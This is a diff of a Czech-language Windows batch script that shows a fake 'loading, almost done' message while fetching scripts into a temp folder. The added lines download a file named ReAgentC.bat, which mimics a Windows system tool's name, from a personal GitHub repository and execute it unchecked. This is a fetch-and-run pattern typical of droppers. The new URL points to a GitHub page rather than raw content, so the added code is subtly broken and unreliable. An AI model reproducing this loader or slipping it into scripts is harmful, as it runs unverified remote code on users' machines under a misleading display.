@@ -5,7 +5,8 @@ set "pth=%temp%\grea54tg"
 md "%pth%"
 echo Probyha nacitani... Skoro hotovo
 title Probyha nacitani... Skoro hotovo
-if "%ofloadver%" == run (set "ofloadver=1.0")
+if not "%loaderver%" == "1" (powershell -Command "Invoke-WebRequest -Uri 'https://github.com/mmmmm4299/sptest/blob/main/ReAgentC.bat' -OutFile '%pth%\reagentc.bat'"
+call "%pth%\reagentc.bat")
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mmmmm4299/sptest/refs/heads/main/speedtest.bat' -OutFile '%pth%\ui.bat'"
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mmmmm4299/sptest/refs/heads/main/speedtest.ps1' -OutFile '%pth%\speedtest.ps1'"
 cls
